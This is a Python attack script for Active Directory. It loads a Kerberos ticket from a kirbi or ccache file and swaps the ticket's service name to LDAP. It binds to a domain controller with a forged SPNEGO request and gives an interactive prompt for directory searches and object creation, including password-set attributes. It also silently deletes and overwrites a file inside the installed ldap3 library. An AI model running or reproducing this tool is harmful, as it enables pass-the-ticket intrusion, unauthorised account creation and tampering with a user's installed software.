import base64
import importlib
import json
import sys

if len(sys.argv) < 5:
    print("usage:\n\t ldap4ker.py server_ip server_hostname.domain /path/to/ccache(kirbi) mode('s' represent 'search')")
    sys.exit()
hahahahahahh="""


# Created on 2013.05.31
#
# Author: Giovanni Cannata
#
# Copyright 2013 - 2020 Giovanni Cannata
#
# This file is part of ldap3.
#
# ldap3 is free software: you can redistribute it and/or modify
# it under the terms of the GNU Lesser General Public License as published
# by the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# ldap3 is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU Lesser General Public License for more details.
#
# You should have received a copy of the GNU Lesser General Public License
# along with ldap3 in the COPYING and COPYING.LESSER files.
# If not, see <http://www.gnu.org/licenses/>.

from .. import SIMPLE, ANONYMOUS, SASL, STRING_TYPES
from ..core.results import RESULT_CODES
from ..core.exceptions import LDAPUserNameIsMandatoryError, LDAPPasswordIsMandatoryError, LDAPUnknownAuthenticationMethodError, LDAPUserNameNotAllowedError
from ..protocol.sasl.sasl import validate_simple_password
from ..protocol.rfc4511 import Version, AuthenticationChoice, Simple, BindRequest, ResultCode, SaslCredentials, BindResponse, \
    LDAPDN, LDAPString, Referral, ServerSaslCreds, SicilyPackageDiscovery, SicilyNegotiate, SicilyResponse
from ..protocol.convert import authentication_choice_to_dict, referrals_to_list
from ..utils.conv import to_unicode, to_raw

# noinspection PyUnresolvedReferences
def bind_operation(version,
                   authentication,
                   name='',
                   password=None,
                   sasl_mechanism=None,
                   sasl_credentials=None,
                   auto_encode=False):
    # BindRequest ::= [APPLICATION 0] SEQUENCE {
    #                                           version        INTEGER (1 ..  127),
    #                                           name           LDAPDN,
    #                                           authentication AuthenticationChoice }
    request = BindRequest()
    request['version'] = Version(version)
    if name is None:
        name = ''
    if isinstance(name, STRING_TYPES):
        request['name'] = to_unicode(name) if auto_encode else name
    if authentication == SIMPLE:
        if not name:
            raise LDAPUserNameIsMandatoryError('user name is mandatory in simple bind')
        if password:
            
            from ldap3.protocol.rfc4511 import SaslCredentials
            if isinstance(password, SaslCredentials):
                request['authentication'] = AuthenticationChoice().setComponentByName('sasl', password)
            else:
                request['authentication'] = AuthenticationChoice().setComponentByName('simple', Simple(validate_simple_password(password)))
        else:
            raise LDAPPasswordIsMandatoryError('password is mandatory in simple bind')
    elif authentication == SASL:
        sasl_creds = SaslCredentials()
        sasl_creds['mechanism'] = sasl_mechanism
        if sasl_credentials is not None:
            sasl_creds['credentials'] = sasl_credentials
        # else:
            # sasl_creds['credentials'] = None
        request['authentication'] = AuthenticationChoice().setComponentByName('sasl', sasl_creds)
    elif authentication == ANONYMOUS:
        if name:
            raise LDAPUserNameNotAllowedError('user name not allowed in anonymous bind')
        request['name'] = ''
        request['authentication'] = AuthenticationChoice().setComponentByName('simple', Simple(''))
    elif authentication == 'SICILY_PACKAGE_DISCOVERY':  # https://msdn.microsoft.com/en-us/library/cc223501.aspx
        request['name'] = ''
        request['authentication'] = AuthenticationChoice().setComponentByName('sicilyPackageDiscovery', SicilyPackageDiscovery(''))
    elif authentication == 'SICILY_NEGOTIATE_NTLM':  # https://msdn.microsoft.com/en-us/library/cc223501.aspx
        request['name'] = 'NTLM'
        request['authentication'] = AuthenticationChoice().setComponentByName('sicilyNegotiate', SicilyNegotiate(name.create_negotiate_message()))  # ntlm client in self.name
    elif authentication == 'SICILY_RESPONSE_NTLM':  # https://msdn.microsoft.com/en-us/library/cc223501.aspx
        name.parse_challenge_message(password)  # server_creds returned by server in password
        server_creds = name.create_authenticate_message()
        if server_creds:
            request['name'] = ''
            request['authentication'] = AuthenticationChoice().setComponentByName('sicilyResponse', SicilyResponse(server_creds))
        else:
            request = None
    else:
        raise LDAPUnknownAuthenticationMethodError('unknown authentication method')

    return request


def bind_request_to_dict(request):
    return {'version': int(request['version']),
            'name': str(request['name']),
            'authentication': authentication_choice_to_dict(request['authentication'])}


def bind_response_operation(result_code,
                            matched_dn='',
                            diagnostic_message='',
                            referral=None,
                            server_sasl_credentials=None):
    # BindResponse ::= [APPLICATION 1] SEQUENCE {
    #                                            COMPONENTS OF LDAPResult,
    #                                            serverSaslCreds    [7] OCTET STRING OPTIONAL }
    response = BindResponse()
    response['resultCode'] = ResultCode(result_code)
    response['matchedDN'] = LDAPDN(matched_dn)
    response['diagnosticMessage'] = LDAPString(diagnostic_message)
    if referral:
        response['referral'] = Referral(referral)

    if server_sasl_credentials:
        response['serverSaslCreds'] = ServerSaslCreds(server_sasl_credentials)

    return response


def bind_response_to_dict(response):
    return {'result': int(response['resultCode']),
            'description': ResultCode().getNamedValues().getName(response['resultCode']),
            'dn': str(response['matchedDN']),
            'message': str(response['diagnosticMessage']),
            'referrals': referrals_to_list(response['referral']) if response['referral'] is not None and response['referral'].hasValue() else [],
            'saslCreds': bytes(response['serverSaslCreds']) if response['serverSaslCreds'] is not None and response['serverSaslCreds'].hasValue() else None}


def sicily_bind_response_to_dict(response):
    return {'result': int(response['resultCode']),
            'description': ResultCode().getNamedValues().getName(response['resultCode']),
            'server_creds': bytes(response['matchedDN']),
            'error_message': str(response['diagnosticMessage'])}


def bind_response_to_dict_fast(response):
    response_dict = dict()
    response_dict['result'] = int(response[0][3])  # resultCode
    response_dict['description'] = RESULT_CODES[response_dict['result']]
    response_dict['dn'] = to_unicode(response[1][3], from_server=True)  # matchedDN
    response_dict['message'] = to_unicode(response[2][3], from_server=True)  # diagnosticMessage
    response_dict['referrals'] = None  # referrals
    response_dict['saslCreds'] = None  # saslCreds
    for r in response[3:]:
        if r[2] == 3:  # referrals
            response_dict['referrals'] = referrals_to_list(r[3])  # referrals
        else:
            response_dict['saslCreds'] = bytes(r[3])  # saslCreds

    return response_dict


def sicily_bind_response_to_dict_fast(response):
    response_dict = dict()
    response_dict['result'] = int(response[0][3])  # resultCode
    response_dict['description'] = RESULT_CODES[response_dict['result']]
    response_dict['server_creds'] = bytes(response[1][3])  # server_creds
    response_dict['error_message'] = to_unicode(response[2][3], from_server=True)  # error_message

    return response_dict
"""
import ldap3
from ldap3 import DEREF_NEVER
import os

file_tomodify = os.path.dirname(ldap3.__file__) + os.path.sep + "operation" + os.path.sep + "bind.py"
# print(file_tomodify)
file_tomodify
if os.path.exists(file_tomodify):
    os.remove(file_tomodify)
    with open(file_tomodify, "w") as myfile:
        myfile.write(hahahahahahh)
else:
    with open(file_tomodify, "w") as myfile:
        myfile.write(hahahahahahh)
importlib.reload(ldap3)

import argparse
import struct

from impacket import version
from impacket.krb5.ccache import CCache


def parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument('input_file', help="File in kirbi (KRB-CRED) or ccache format")
    parser.add_argument('output_file', help="Output file")
    return parser.parse_args()


def is_kirbi_file(filename):
    with open(filename, 'rb') as fi:
        fileid = struct.unpack(">B", fi.read(1))[0]
    return fileid == 0x76


def is_ccache_file(filename):
    with open(filename, 'rb') as fi:
        fileid = struct.unpack(">B", fi.read(1))[0]
    return fileid == 0x5


def convert_kirbi_to_ccache(input_filename, output_filename):
    ccache = CCache.loadKirbiFile(input_filename)
    ccache.saveFile(output_filename)


def masin(filename, target_file):
    if is_kirbi_file(filename):
        print('[*] kirbi detected! converting to ccache format...')
        convert_kirbi_to_ccache(filename, target_file)
        print('[+] convert finished')
def convert_ccache_to_kirbi(input_filename, output_filename):
    ccache = CCache.loadFile(input_filename)
    ccache.saveKirbiFile(output_filename)
import re
import sys
from ldap3 import Server, Connection, SUBTREE
from impacket.krb5 import constants, types
from impacket.krb5.asn1 import AP_REQ, TGS_REP, seq_set, Authenticator, KRB_CRED
from impacket.krb5.ccache import CCache
from impacket.krb5.gssapi import KRB5_AP_REQ
from impacket.krb5.types import Ticket, KerberosTime, Principal
from impacket.spnego import SPNEGO_NegTokenInit, TypesMech, asn1encode, ASN1_OID, ASN1_AID
from ldap3 import Server, Connection, ALL

from ldap3.protocol.rfc4511 import BindRequest, Version, AuthenticationChoice, SaslCredentials, LDAPMessage, MessageID, \
    ProtocolOp
from pyasn1.codec.ber.encoder import encode
from pyasn1.codec.der import encoder, decoder
from pyasn1.type.univ import noValue

import os

file = "Hello.py"

dc_ip = sys.argv[1]
file = sys.argv[3]
file_prefix = os.path.splitext(file)[0]
file_suffix = os.path.splitext(file)[-1]

aguidfagshuidgasuidguitewg97fuyis = ""
if is_kirbi_file(file):

    target_file = file_prefix + ".ccache"
    masin(file, target_file)
    aguidfagshuidgasuidguitewg97fuyis = target_file
elif is_ccache_file(file):
    aguidfagshuidgasuidguitewg97fuyis = file

import datetime
from struct import pack

from impacket.krb5 import constants
from impacket.krb5.asn1 import AP_REQ, TGS_REP, seq_set, Authenticator
from impacket.krb5.ccache import CCache
from impacket.krb5.gssapi import KRB5_AP_REQ
from impacket.krb5.types import Ticket, KerberosTime, Principal
from impacket.spnego import SPNEGO_NegTokenInit, TypesMech, asn1encode, ASN1_OID, ASN1_AID
from ldap3 import Server, Connection, ALL


from ldap3.protocol.rfc4511 import BindRequest, Version, AuthenticationChoice, SaslCredentials, LDAPMessage, MessageID, \
    ProtocolOp
from pyasn1.codec.ber.encoder import encode
from pyasn1.codec.der import encoder, decoder
from pyasn1.type.univ import noValue

request = BindRequest()

request['version'] = Version(3)

request['name'] = ""

sasl_creds = SaslCredentials()
sasl_creds['mechanism'] = "GSS-SPNEGO"
blob = SPNEGO_NegTokenInit()
blob['MechTypes'] = [TypesMech['MS KRB5 - Microsoft Kerberos 5']]
apReq = AP_REQ()
apReq['pvno'] = 5
apReq['msg-type'] = int(constants.ApplicationTagNumbers.AP_REQ.value)
apReq['ap-options'] = constants.encodeFlags(list())
ticket = Ticket()
ccache = CCache.loadFile(aguidfagshuidgasuidguitewg97fuyis)
print("[+] ccache file loaded")
principal = 'ldap/%s@%s' % (sys.argv[2].upper(), sys.argv[2].split('.',1)[1].upper())
print("[+] extract ticket")
creds = ccache.getCredential(principal)
ticket = types.Ticket()
ticket.from_asn1(creds.ticket['data'])
fucking_content = str(ticket.service_principal).upper()
if principal.split("/")[0].upper() != fucking_content.upper().split("/")[0]:
    print("[*] ldap ticket required but get %s, trying to modify it..." % fucking_content)
    print(
        "[*] if the ldap and %s is running under the same service account, modification to the ticket will work" % fucking_content)
principal2 = '%s/%s@%s' % (fucking_content, sys.argv[2].upper(), sys.argv[2].split('.',1)[1].upper())
creds = ccache.getCredential(principal2)
if creds == None:
    principal2 = '%s/%s@%s' % (fucking_content, sys.argv[2].upper().split('.')[0], sys.argv[2].split('.',1)[1].upper())
    creds = ccache.getCredential(principal2)
TGS = creds.toTGS(principal)

tgs = TGS['KDC_REP']
tgs = decoder.decode(tgs, asn1Spec=TGS_REP())[0]
ticket.from_asn1(tgs['ticket'])
user = creds['client'].prettyPrint().split(b'@')[0].decode('utf-8')
seq_set(apReq, 'ticket', ticket.to_asn1)

authenticator = Authenticator()
authenticator['authenticator-vno'] = 5
authenticator['crealm'] = sys.argv[2].split('.',1)[1]
userName = Principal(user, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
seq_set(authenticator, 'cname', userName.components_to_asn1)
now = datetime.datetime.utcnow()
# 构造认证字段
authenticator['cusec'] = now.microsecond
authenticator['ctime'] = KerberosTime.to_asn1(now)
encodedAuthenticator = encoder.encode(authenticator)
cipher = TGS['cipher']
sessionKey = TGS['sessionKey']
encryptedEncodedAuthenticator = cipher.encrypt(sessionKey, 11, encodedAuthenticator, None)
apReq['authenticator'] = noValue
apReq['authenticator']['etype'] = cipher.enctype
apReq['authenticator']['cipher'] = encryptedEncodedAuthenticator

blob['MechToken'] = pack('B', ASN1_AID) + asn1encode(pack('B', ASN1_OID) + asn1encode(
    TypesMech['KRB5 - Kerberos 5']) + KRB5_AP_REQ + encoder.encode(apReq))

print("[+] SPNEGO packet build finished")
sasl_credentials = blob.getData()
if sasl_credentials is not None:
    sasl_creds['credentials'] = sasl_credentials

total_entries = 0
server = Server('test-server')
server = Server(dc_ip, port=389, get_info=ALL)
c = Connection(server, user='s', password=sasl_creds)
conn = Connection(server, auto_bind=True)

savedStdout = sys.stdout
with open('out.txt', 'w') as file:
    sys.stdout = file
    print(server.info)
sys.stdout = savedStdout
file = open('out.txt', mode='r')

# read all lines at once
all_of_it = file.read()
all_of_it = all_of_it.replace("\n", "q3eyhatgeujryhrthtrhfgh")
all_of_it = all_of_it.split("Naming contexts: ")[1].split("Supported controls: ")[0]
all_of_it = all_of_it.replace("q3eyhatgeujryhrthtrhfgh", "\n")

all_of_it = re.sub(r"\s+", "wouldyouforkme", all_of_it)

all_of_it = all_of_it.replace("wouldyouforkme", "\n")

all_of_it = all_of_it.strip()

this_is_the_search_base = all_of_it.split("\n")[0]

c.bind()
print("[+] server bind success! now you can fuck at will")
# c.search(search_base = this_is_the_search_base,
#          search_filter = '(sAMAccountName=Administrator)',
#          search_scope = SUBTREE,
#          attributes = ['sAMAccountName', 'mail'],
#          paged_size = 5)
# total_entries += len(c.response)
# total_entries = 0
# for entry in c.response:
#     if 'dn' in entry:
#         print(entry['dn'], entry['attributes'])
#         total_entries+=1
#cookie = c.result['controls']['1.2.840.113556.1.4.319']['value']['cookie']
first_flag = True
cookie = True
def fuck(filter):
    temp_filter = filter.split(" ")[0]
    attributes_you_want =None
    if " " not in filter:
        temp_filter = filter
        attributes_you_want = ['sAMAccountName']
    else:
        attributes_you_want = filter.replace(temp_filter+" ", "").split(" ")
    c.search(search_base = this_is_the_search_base,
             search_filter = '(%s)' % (temp_filter),
             search_scope = SUBTREE,dereference_aliases=DEREF_NEVER,
             attributes = attributes_you_want,
             paged_size = 1000)


    total_entries = 0
    cookie = c.result['controls']['1.2.840.113556.1.4.319']['value']['cookie']
    #print(cookie)
    for entry in c.response:
        if 'dn' in entry:
            print("\033[34m"+entry['dn']+"\033[0m\n", entry['attributes'])
            total_entries+=1
    print('\n\033[0;34mTotal entries retrieved: ' +str(total_entries)+'\033[0m')

def add_fuck(filter):
    temp_filter = filter
    dn = None
    object_class = None
    attributes = None
    controls = None
    if "dn" in temp_filter:
        dn = temp_filter.split("dn=")[1].split(" attributes=")[0]
    if "attributes" in temp_filter:
        attributes = temp_filter.split("attributes=")[1]
        attributes = json.loads(attributes)
        if 'unicodePwd' in attributes:
            # sasl_csdsdsdreds = SaslCredentials()
            #sasl_csdsdsdreds['mechanism'] = '"'+attributes['unicodePwd']+'"'
            ##attributes['unicodePwd'] = encode(sasl_csdsdsdreds['mechanism'])
            # attributes['unicodePwd'] = encode(sasl_csdsdsdreds['mechanism'])
            attributes['unicodePwd']= '"'+attributes['unicodePwd']+'"'
            attributes['unicodePwd'] =attributes['unicodePwd'].encode('utf-16be')


    if " " not in filter:
        temp_filter = filter
        attributes_you_want = ['sAMAccountName']
    else:
        attributes_you_want = filter.replace(temp_filter+" ", "").split(" ")
    c.add(dn = dn,
          object_class = object_class,
          attributes = attributes,
          controls = controls)


    print('\n\033[0;34m' +str(c.result)+'\033[0m')
while True:

    #sAMAccountName=Administrator
    if sys.argv[4] == "s":
        fuck(input('ldap> '))
    if sys.argv[4] == "a":
        add_fuck(input('ldap> '))
